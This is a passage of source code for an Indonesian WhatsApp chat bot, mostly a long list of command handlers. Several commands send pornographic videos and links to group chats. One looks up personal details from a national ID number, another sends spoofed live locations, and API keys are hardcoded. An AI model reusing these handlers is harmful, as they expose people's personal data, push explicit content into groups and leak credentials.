              emoji.get(`${emoje}`).then(emoji => {
				teks = `${emoji.images[2].url}`
    			sendWebp(from,`${teks}`)	
    			console.log(teks)
   				})
              await limitAdd(sender)
break
}
await limitAdd(sender)
break
case 'bc2':
					dha.updatePresence(from, Presence.composing)
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					if (args.length < 1) return reply('Teksnya?')
					anu = await dha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await dha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							dha.sendMessage(_.jid, buff, image, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await dha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							dha.sendMessage(_.jid, buff, video, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await dha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							dha.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: finv, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
					} else {
						for (let _ of anu) {
							//sendMess(_.jid, `${body.slice(4)}`)
buttons = [{buttonId: `${prefix}menu`, buttonText: {displayText: 'MENU'}, type: 1},{buttonId: `${prefix}owner`, buttonText: {displayText: 'OWNER'}, type: 1}]
const btnbc = {
    contentText: `${body.slice(4)}`,
    footerText: '*_BROADCAST_*',
    buttons: buttons,
    headerType: 1
}
await dha.sendMessage(_.jid, btnbc, MessageType.buttonsMessage, {quoted: mek})
						}
						reply(`Sukses mengirim Broadcast:\n${body.slice(4)}`)
					}
					await limitAdd(sender)
break

case 'setprofile':
				case 'setpp':
				dha.updatePresence(from, Presence.composing)
				if (!isQuotedImage) return reply('Reply imagenya!')
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					enmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediau = await dha.downloadAndSaveMediaMessage(enmediau)
					await dha.updateProfilePicture(botNumber, mediau)
					reply('Sukses')
					await limitAdd(sender)
break
case 'ps':
case 'Ps':
if (!isPremium) return reply(`Only Prem`)
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Example: ${prefix + command} Blowjob`)
                    query = args.join(" ")
pepex = await fetchJson(`https://kocakz.herokuapp.com/api/media/pornhub/search?query=${query}`)
sticWait(from)
pepex = pepex.res.results
ini_txt = ""
for (var x of pepex) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Views : ${x.views}\n`
ini_txt += `Link : ${x.link}\n\n\n`
}
anu = `${ini_txt}\n\n  *DOWNLOAD*
 ${prefix}xvideo [link xvid] = Video`
dha.sendMessage(from, anu, text, {quoted: mek})
await limitAdd(sender)
break
case 'foto':
case 'fotokeren':
if (args.length == 0) return reply(`Example: ${prefix + command} Blowjob`)
                    query = args.join(" ")
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
x = await getBuffer(`https://tyz-api.herokuapp.com/search/dhacoders?query=${query}`)
dha.sendMessage(from, x, image, {quoted: mek})
await limitAdd(sender)
await limitAdd(sender)
break
case 'verify':
if (isRegistered) return sticOk(from)
const serialUser = createSerial(18)
	        veri = sender
	        _registered.push(sender)
	        fs.writeFileSync('./database/registered.json', JSON.stringify(_registered))
	        addRegisteredUser(sender, serialUser)
	         const jancok = `╭─❒ 「 Verify 」 ❒
 * Nama :* ${pushname}
 * Nomor :* @${sender.split('@')[0]}
 * Seri:* ${serialUser}
 * Pengguna:* ${_registered.length}
└❏

*「 Katashi Hana 」*`
gbutsan = [
{buttonId:`${prefix}menu`,buttonText:{displayText:'MENU'},type:1},
{buttonId:`${prefix}donasi`,buttonText:{displayText:'DONASI'},type:1}
]
mhan = await dha.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const sendBtnVeryy = {
imageMessage: mhan.message.imageMessage,
contentText:`${jancok}`,
footerText:'Terimakasih Sudah Mendaftar\n*_© katashi_*', 
buttons: gbutsan,
headerType: 4
}
dha.sendMessage(from, sendBtnVeryy, MessageType.buttonsMessage, {quoted:mek, contextInfo: { mentionedJid: [sender]}})
	         console.log(color('[REGISTER]'), color(time, 'yellow'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
	    // console.log(e)
break
case "limit":
				// Fix Case By Yogi/Hansâ›”
                 
				checkLimit(sender)
break
case 'bann':
				if (!isOwner) return reply('*Only Admin bot*')
				bnnd = body.slice(5)
				ban.push(`${bnnd}@s.whatsapp.net`)
				fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
				reply(`Berhasil membanned nomor : wa.me/${bnnd} `)
				break
		case 'unbann':
				if (!isOwner) return reply('*Only Admin bot*')
				bnnd = body.slice(7)
				ban.splice(`${bnnd}@s.whatsapp.net`, 1)
				fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
				reply(`Nomor wa.me/${bnnd} telah di unban!`)
				break
                
                case 'banlist':
                case 'listban':
				dha.updatePresence(from, Presence.composing) 
				
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				teks = 'This is list of banned number :\n'
				for (let benn of ban) {
					teks += `~> @${benn.split('@')[0]}\n`
					}
					teks += `Total : ${ban.length}`
				dha.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": ban}})
				break
case 'lpr':
case 'lapor':
					query = args.join(" ")
					if (query.length > 300) return dha.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', msgType.text, {quoted: mek})
					var nomor = mek.participant
					teks1 = `*[LAPORAN]*\nNomor : @${nomor.split("@s.whatsapp.net")[0]}\n Tex : ${query}`
					var options = {
					text: teks1,
					contextInfo: {mentionedJid: [nomor]},
					}
					dha.sendMessage('6281932664252@s.whatsapp.net', options, text, {quoted: mek})
					reply('Masalah telah di laporkan ke owner katashi Laporan palsu atau main² tidak akan ditanggapi.')
					break
case 'antilinkyoutube-v':
//by Fernazer
//fix By Fernazer
                    if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
					if (!isGroupAdmins) return reply(mess.only.admin)
               if (!isGroup) return reply(mess.only.group)
					if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
					if (Number(args[0]) === 1) {
						if (isAntiLinkytv) return reply('anti link YouTube video sudah aktif')
						antilinkytv.push(from)
						fs.writeFileSync('./database/antilinkyt.json', JSON.stringify(antilinkytv))
						reply('Sukses mengaktifkan anti link YouTube di group ini ✔️')
						dha.sendMessage(from,`「 *NOTICE GROUP* 」Jika bukan admin jangan kirim link YouTube Video`, text)
					} else if (Number(args[0]) === 0) {
						if (isAntiLinkytv) return reply('Mode anti link YouTube video sudah Mati')
						var ini = antilinkytv.indexOf(from)
						antilinkytv.splice(ini, 1)
						fs.writeFileSync('./database/antilinkyt.json', JSON.stringify(antilinkytv))
						reply('Sukes menonaktifkan anti link YouTube video di group ini ✔️')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					break
case 'antilinkyoutube-c':
//by Fernazer
//fix By Fernazer
                    if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
					if (!isGroupAdmins) return reply(mess.only.admin)
               if (!isGroup) return reply(mess.only.group)
					if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
					if (Number(args[0]) === 1) {
						if (isAntiLinkytc) return reply('anti link YouTube channel sudah aktif')
						antilinkytc.push(from)
						fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(antilinkytc))
						reply('Sukses mengaktifkan anti link YouTube channel di group ini ✔️')
						dha.sendMessage(from,`「 *NOTICE GROUP* 」Jika bukan admin jangan kirim link YouTube Channel`, text)
					} else if (Number(args[0]) === 0) {
						if (isAntiLinkytc) return reply('Mode anti link YouTube channel sudah Mati')
						var ini = antilinkytv.indexOf(from)
						antilinkytc.splice(ini, 1)
						fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(antilinkytc))
						reply('Sukes menonaktifkan anti link YouuTube channel di group ini ✔️')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					break

case 'antilinktelegram':
//by @Fernazer
//Fix By Fernazer
                    if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
					if (!isGroupAdmins) return reply(mess.only.admin)
               if (!isGroup) return reply(mess.only.group)
					if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
					if (args[0] === '1') {
					if (isAntiLinkTelegram) return reply('*SUDAH DI AKTIFKAN SEBELUMNYA*')
						antitelegram.push(from)
						fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(antitelegram))
						reply('「 *TELEGRAM DETECTOR* 」 PERINTAH DITERIMA, ANTI LINK TELEGRAM SUDAH ENABLE!')
						dha.sendMessage(from,`「 *NOTICE GROUP* 」Jika bukan admin jangan kirim link Telegram! Jika Anda Kirim Maka Bot Akan Mengeluarkanmu.`, text)
					} else if (args[0] === '0') {
						var ini = antitelegram.indexOf(from)
						antitelegram.splice(ini, 1)
						fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(antitelegram))
						reply('「 *TELEGRAM DETECTOR* 」 PERINTAH DI TERIMA, ANTI LINK TELEGRAM SUDAH DISABLE!')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					break
					case 'timer':
				if (args[1]=="detik") {var timer = args[0]+"000"
				} else if (args[1]=="menit") {var timer = args[0]+"0000"
				} else if (args[1]=="jam") {var timer = args[0]+"00000"
				} else {return reply("*pilih:*\ndetik\nmenit\njam")}
				setTimeout( () => {
				reply("Waktu habis")
				}, timer)
				break
				case 'nekopoi1':
qute = fs.readFileSync('./media/ganteng.jpg') 
dha.sendMessage(from, qute, image, { quoted: mek, caption: 'NIH LINKNYA: https://www2.zippyshare.com/d/z9dcY6Nr/791216/%5bNekoPoi%5d_Akina_to_Onsen_de_H_Shiyo%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi2':
qute = fs.readFileSync('./media/ganteng.jpg') 
dha.sendMessage(from, qute, image, { quoted: mek, caption: 'NIH LINKNYA: https://www4.zippyshare.com/d/j7PFLGUY/946757/%5bNekoPoi%5d_Tsuma_ga_Kirei_ni_Natta_Wake_-_02_%5b360P%5d_%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi3':
qute = fs.readFileSync('./media/ganteng.jpg') 
dha.sendMessage(from, qute, image, { quoted: mek, caption: 'NIH LINKNYA: https://www111.zippyshare.com/d/EK5uqIMh/566060/%5bNekoPoi%5d_Megane_no_Megami_-_01_%5b360P%5d_%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi4':
qute = fs.readFileSync('./media/ganteng.jpg') 
dha.sendMessage(from, qute, image, { quoted: mek, caption: 'NIH LINKNYA: https://www109.zippyshare.com/d/2ebALhhS/463654/%5bNekoPoi%5d_Watashi_ga_Toriko_-_02%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi5':
qute = fs.readFileSync('./media/ganteng.jpg') 
dha.sendMessage(from, qute, image, { quoted: mek, caption: 'NIH LINKNYA: https://www115.zippyshare.com/d/LmzOkRAI/313299/%5bNekoPoi%5d_Chichi-iro_Toiki_-_01_%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi6':
qute = fs.readFileSync('./media/ganteng.jpg') 
dha.sendMessage(from, qute, image, { quoted: mek, caption: 'NIH LINKNYA: https://www89.zippyshare.com/d/SgEHvrJs/42812/%5bNekoPoi%5d_Chichi-iro_Toiki_-_02_%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi7':
qute = fs.readFileSync('./media/ganteng.jpg') 
dha.sendMessage(from, qute, image, { quoted: mek, caption: 'NIH LINKNYA: https://www66.zippyshare.com/d/j0ivbciL/520411/%5bNekoPoi%5d_Onna_Maou_Melissa_no_H_na_Boukenki_-_01_%5b360P%5d_%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi8':
qute = fs.readFileSync('./media/ganteng.jpg') 
dha.sendMessage(from, qute, image, { quoted: mek, caption: 'NIH LINKNYA: https://www71.zippyshare.com/d/M225YIrR/535656/%5bNekoPoi%5d_Buta_no_Gotoki_Sanzoku_ni_Torawarete_Shojo_wo_Ubawareru_Kyonyuu_Himekishi_Onna_Senshi_-_01%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi9':
qute = fs.readFileSync('./media/ganteng.jpg') 
dha.sendMessage(from, qute, image, { quoted: mek, caption: 'NIH LINKNYA: https://www49.zippyshare.com/d/bdwYjaXS/605790/%5bNekoPoi%5d_Akebi_no_Hana___Maho_-_01_%5b360P%5d_%5bnekopoi.pro%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
case "brainly":
if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!isPremium) return reply(`Only Prem`)
        if (args.length < 1) return reply("Pertanyaan apa");
        brien = args.join(" ");
        teks = '*「 _BRAINLY NOT WORK_ 」*'
        brainly(`${brien}`).then((res) => {
          for (let i = 0; i < res.length; i++) {
            teks += `\n\n*➸ Pertanyaan:* ${res.data[i].pertanyaan}\n*➸ Jawaban:* ${res.data[i].jawaban[0].text}\n\n`;
          }
          dha.sendMessage(from, teks, text, {
            quoted: mek,
            detectLinks: false,
          });
        });
        break;
case "nekopoilatest":
if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!isPremium) return reply(`Only Prem`)
        neko.latest().then((ne) => {
        	teks = '*「 _NEKOPOI_ 」*'
          for (let i = 0; i < ne.result.length; i++) {
            teks += `\n\n*➸ Title:* ${ne.result[i].title}\n*➸ Link:* ${ne.result[i].link}\n\n`;
          }
          dha.sendMessage(from, teks, text, {
            quoted: mek,
            detectLinks: false,
          });
        });
        break;
        case "nekopoisearch":
        case "nekopois":
        if (!isPremium) return reply(`Only Prem`)
        if (args.length < 1) return reply("Nyari apa?");
        query = args.join(" ");
        neko.search(`${query}`).then((ne) => {
        	teks = '*「 _NEKOPOI_ 」*'
          for (let i = 0; i < ne.result.length; i++) {
            teks += `\n\n*➸ Title:* ${ne.result[i].title}\n*➸ Link:* ${ne.result[i].link}\n*➸ Img:* ${ne.result[i].img}\n\n`;
          }
          dha.sendMessage(from, teks, text, {
            quoted: mek,
            detectLinks: false,
          });
        });
        break;
        case "nekopoirandom":
        case "nekopoir":
        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!isPremium) return reply(`Only Prem`)
        neko.random().then((ne) => {
        	teks = '*「 _NEKOPOI_ 」*'
          for (let i = 0; i < ne.result.length; i++) {
            teks += `\n\n*➸ Title:* ${ne.result[i].title}\n*➸ Link:* ${ne.result[i].link}\n*➸ Image:* ${ne.result[i].img}\n*➸ Synopsis:* ${ne.result[i].synopsis}\n*➸ Score:* ${ne.result[i].score}\n*➸ Duration:* ${ne.result[i].duration}\n*➸ Genre:* ${ne.result[i].genre}\n\n`;
          }
          dha.sendMessage(from, teks, text, {
            quoted: mek,
            detectLinks: false,
          });
        });
        break;
case "nekopoi":
        if (isBanned) return reply('Lu udh kena ban')
        if (args.length == 0) return reply(`${prefix + command} Link Nekopoi\nPASTIKAN ITU LINK NEKOPOI, JIKA BUKAN LINK NEKOPOI MAKA TIDAK AKAN WORK`)
        nekop.getVideo(args[0]).then((i) => {
          console.log(i);
          teks = `*Title* : ${i.title}
          \n*Link* : ${i.links}\n*Genre* `
          reply(teks)
        });
        
await limitAdd(sender)
break;
case 'kubik':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Angkanya?`)
                    c = args.join(" ")
x = await fetchJson(`https://leyscoders-api.herokuapp.com/api/bdr/kubik?q=${c}&apikey=MIMINGANZ`)
dha.sendMessage(from, `${x.result}`, text, {quoted: mek})
await limitAdd(sender)
break
case 'kuadrat':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Angkanya?`)
                    c = args.join(" ")
x = await fetchJson(`https://leyscoders-api.herokuapp.com/api/bdr/kuadrat?q=${c}&apikey=MIMINGANZ`)
dha.sendMessage(from, `${x.result}`, text, {quoted: mek})
await limitAdd(sender)
break
case 'nik':  
      case 'NIK':  
      sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
					if (args.length == 0) return reply(`NIK nya?`)
                    c = args.join(" ")
      sticWait(from)
                   anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/nik-checker?q=${c}&apikey=MIMINGANZ`)
                   anu1 = ` *Nik* : ${anu.result.nik}\n`
                   anu1 += ` *Gender* : ${anu.result.kelamin}\n` 
                   anu1 += ` *Date Of Birth* : ${anu.result.tgl_lahir}\n`
                   anu1 += ` *Province* : ${anu.result.provinsi}\n`
                   anu1 += ` *District* : ${anu.result.kotakab}\n`
                   anu1 += ` *Districts/Kecamatan* : ${anu.result.kecamatan}\n`
                   anu1 += ` *Uniqcode* : ${anu.result.uniqcode}\n`
                   anu1 += ` *Postal Code* : ${anu.result.tambahan.kodepos}\n`
                   anu1 += ` *Pasaran* : ${anu.result.tambahan.pasaran}\n`
                   anu1 += ` *Age* : ${anu.result.tambahan.usia}\n`
                   anu1 += ` *Birthday* : ${anu.result.tambahan.ultah}\n` 
                   reply(anu1)
                   await limitAdd(sender)
break
        case 'groups':
case 'searchgroup':
if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    sticWait(from)
                    get_result = await fetchJson(`https://leyscoders-api.herokuapp.com/api/whatsapp-group?q=${query}&apikey=MIMINGANZ`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.judul}\n`
                        ini_txt += `Link : ${x.link}\n\n`
                    }
                    reply(ini_txt)
                    await limitAdd(sender)
break
case 'soundcloud':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://hadi-api.herokuapp.com/api/soundcloud/download?url=${query}`)
                    yoo = get_result.result
                    ini_txt = `Title : ${yoo.title}\n`
                    ini_txt += `Link : ${query}\n`
                    thumbnail = await getBuffer(yoo.thumbnail)
                    await dha.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    sticWait(from)
                    get_audio = await getBuffer(yoo.download)
                    await dha.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${yoo.lagu}.mp3`, quoted: mek })
                    await limitAdd(sender)
break
case "hentaivid":
case "hentaivideo":
if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!isPremium) return reply(`Only Prem`)
        teks = '*「 _HENTAI VIDEO_  」*'
        scrap.hentaivid().then((res) => {
        	console.log(res);
        teks += `*➸ Title:* ${res.hasil.title}\n*➸ Link:* ${res.hasil.link}\n*➸ Kategori : ${res.hasil.category}\n*➸ Share : ${res.hasil.share_count}\n*➸ View : ${res.hasil.views_count}\n*➸ Type : ${res.hasil.type}\n\n`
                    vid1 = `${res.hasil.video_1}`
                    vid2 = `${res.hasil.video_2}`
                    sendMediaURL(from, vid1);
                    sendMediaURL(from, vid2);
          dha.sendMessage(from, teks, text, {
            quoted: mek,
            detectLinks: false,
          });
        });
        break;
        case "anoboys":
        if (args.length < 1) return reply("Cari apa?");
        teks = '*「 _ANOBOYS SEARCH_ 」*'
        scrap.anoboys(args[0]).then((res) => {
          for (let i = 0; i < res.data.length; i++) {
            teks += `\n\n*➸ Title:* ${res.data[i].judul}\n*➸ Url:* ${res.data[i].link}\n\n`;
          }
          dha.sendMessage(from, teks, text, {
            quoted: mek,
            detectLinks: false,
          });
        });
        break;
case 'cariresep':
                sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                        if (args.length < 1) return reply("Nyari apa?");
        query = args.join(" ");
        scrap.cariresep(`${query}`).then((ttt) => {
                        var tst = `* CARI RESEP *\n\n*Hasil Pencarian : ${body}*\n\n`
                        for(let i = 0; i < ttt.data.length; i++) {
                            tst += `*Judul* : ${ttt.data[i].judul}\n*Link*: ${ttt.data[i].link}\n\n`
                        }
                        dha.sendMessage(from, tst, text, {
            quoted: mek,
            detectLinks: false,
          });
        });
                    await limitAdd(sender)
break
        case 'pixivsearch':
case 'pixivsearch':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                    if (args.length == 0) return reply(`Example: ${prefix + command} Hutao`)
                    query = args.join(" ")
                    sticWait(from)
                    get_result = await fetchJson(`https://tyz-api.herokuapp.com/search/pixiv?query=${query}`)
                    ini_txt = "Pixiv Search"
                    for (var x of get_result.result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Id : ${x.pid}\n`
                        ini_txt += `Upload Date : ${x.uploadDate}\n`
                        ini_txt += `Url : ${x.urls.regular}\n`
                        ini_txt += `R18 : ${x.r18}\n\n`
                    }
                    reply(ini_txt)
                    await limitAdd(sender)
break
case 'nhentaipdf':
             if (!isPremium) return reply(`Only Prem`)
             if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} 317986`)
             try {
             henid = args[0]
             anu = await fetchJson(`https://tyz-api.herokuapp.com/nsfw/nhentaipdf?code=${henid}`)
             pdf = await getBuffer(anu.pdf)
             dha.sendMessage(from, pdf, document, { quoted: mek, mimetype: Mimetype.pdf, filename: `${henid}.pdf`, thumbnail: ini_image })
             } catch (e) {
             console.log(e)
             reply(String(e))
}
             break
case 'go':
case 'wo':	
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isOwner) return reply('*Only Admin bot*')
					if (args.length == 0) return reply(`Example: ${prefix + command} linknya`)
                    query = args.join(" ")
                    vid1 = `${args[0]}`
                    sendMediaURL(from, vid1);
await limitAdd(sender)
break
case 'sharelock':
 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
kntl = `${args.join(' ')}`
nama = kntl.split("|")[0];
impostor = kntl.split("|")[1];
dha.sendMessage(from, {
name: nama,
address: impostor,
jpegThumbnail: ofrply}, MessageType.liveLocation, {quoted:troli})
break
       case 'cekapikey':
              sticWait(from)
              if (!isOwner) return reply('*Only Admin bot*')
              anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/cekapikey?apikey=MIMINGANZ`)
              teks = `*YOUR APIKEY*\n\n➸ Ussername= ${anu.result.apikey}\n➸ Request= ${anu.result.hit}\n`
              dha.sendMessage(from, teks, text, {quoted: troli})
              break
case 'cekapikey2':
              sticWait(from)
              if (!isOwner) return reply('*Only Admin bot*')
              anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/cekapikey?apikey=dappakntlll`)
              teks = `*YOUR APIKEY*\n\n➸ Ussername= ${anu.result.apikey}\n➸ Request= ${anu.result.hit}\n`
              dha.sendMessage(from, teks, text, {quoted: troli})
              break
case 'cerpenhoror':
                case 'Cerpenhoror':
                sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                sticWait(from)
                    get_result = await fetchJson(`https://leyscoders-api.herokuapp.com/api/cerita-horor?apikey=dappakntlll`)
                    get_result = get_result.result
                    teks = `*CERPEN HOROR*\n\n➸ Title : ${get_result.title}\n➸ Story : ${get_result.desc}\n`
              dha.sendMessage(from, teks, text, {quoted: ftoko})
                    await limitAdd(sender)
break
case 'jamdunia':
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                sticWait(from)
                    get_result = await fetchJson(`https://myselfff.herokuapp.com/docs/information/jamdunia`)
                    get_result = get_result.result
                    teks = `*JAM DUNIA*\n\n➸ Wib : ${get_result.wib}\n➸ Wita : ${get_result.wita}\n➸ Wit : ${get_result.wit}\n➸ Matahari : ${get_result.matahari}\n➸ Tanggal : ${get_result.tanggal}\n➸ Detail : ${get_result.detail}\n`
              dha.sendMessage(from, teks, text, {quoted: ftoko})
                    await limitAdd(sender)
break
case 'katajago':
                if (args.length == 0) return reply(`Example: ${prefix + command} ganteng`)
                    query = args.join(" ")
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                sticWait(from)
                    get_result = await fetchJson(`https://myselfff.herokuapp.com/docs/random/katajago?query=${query}`)
                    get_result = get_result.result
                    ini_txt = `List : ${get_result.list}\n`
                    reply(ini_txt)
                    await limitAdd(sender)
break
case 'amazon':
              if (args.length == 0) return reply(`Example: ${prefix + command} rdp`)
                    query = args.join(" ")
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                sticWait(from)
                    get_result = await fetchJson(`https://myselfff.herokuapp.com/docs/search/amazon?query=${query}`)
                    get_result = get_result.result
              teks = `*AMAZON SEARCH*\n\n➸ Item : ${get_result.item}\n➸ Review : ${get_result.review}\n➸ Rating : ${get_result.rating}\n➸ Score : ${get_result.score}\n➸ Price : ${get_result.price}\n➸ Sponsor : ${get_result.sponsor}\n`
              dha.sendMessage(from, teks, text, {quoted: ftoko})
              break
case 'bokep':
try{
  ini_txt = ` وَلَا تَقْرَبُوا۟ ٱلزِّنَىٰٓ ۖ إِنَّهُۥ كَانَ فَٰحِشَةً وَسَآءَ سَبِيلً


Artinya: "Dan janganlah kamu mendekati zina, sesungguhnya zina adalah suatu perbuatan yang keji. Dan suatu jalan yang buruk." (QS. Al-Isra: 32).

Baca artikel detiknews, "Surat Al-Isra Ayat 32, Tentang Larangan Mendekati Zina"`
  if (!isOwner && !mek.key.fromMe) return reply(ini_txt)             
boks = Date.now();
bok = await scrap.pornvid()
bokt = `BOKEP

┬╗ Judul    : ${bok.hasil.title}
┬╗ Upload   : ${bok.hasil.upload}
┬╗ Views    : ${bok.hasil.views}
┬╗ Like     : ${bok.hasil.like}
┬╗ Dislike  : ${bok.hasil.dislike}
┬╗ Favorite : ${bok.hasil.favorite}
┬╗ Tag      : ${bok.hasil.tags}
┬╗ Source   : ${bok.hasil.source}`

sendMediaURL(from, "https://tikporntok.com/"+bok.hasil.thumb, bokt)
sendMediaURL(from, "https://tikporntok.com/"+bok.hasil.video, monospace(`Process ${((Date.now()-boks)/1000).toFixed(1)} Seconds`))
} catch (e){
console.log(e)
reply(e)
}
break
        case "wattpad":
        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
